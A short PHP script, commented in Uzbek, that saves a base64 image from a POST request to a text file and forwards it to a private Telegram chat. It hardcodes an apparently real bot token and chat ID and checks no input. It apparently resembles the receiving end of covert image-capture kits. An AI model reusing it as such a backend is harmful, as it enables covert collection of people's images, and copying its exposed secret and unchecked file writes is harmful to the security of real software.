<?php

// Telegram bot token va chat ID
$token = '7954150480:AAGpwVUbzbeC95bQVL-EES9zSxtHtrOZr8Y';
$chatId = '5936043070'; // Botga rasm yuboriladigan chat ID

// Foydalanuvchidan kelgan rasm (Base64 formatida)
if (isset($_POST['image'])) {
    $base64Image = $_POST['image'];
    
    // Faylga yozish
    $fileName = 'image_' . time() . '.txt';
    file_put_contents($fileName, $base64Image);  // Base64 matnini faylga saqlash

    // Telegramga yuborish
    sendTextToTelegram($fileName, $token, $chatId);
}

function sendTextToTelegram($fileName, $token, $chatId) {
    // Faylni Telegramga yuborish
    $url = "https://api.telegram.org/bot$token/sendDocument";
    $postFields = [
        'chat_id' => $chatId,
        'document' => new CURLFile(realpath($fileName)),
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    $response = curl_exec($ch);
    curl_close($ch);
}
?>
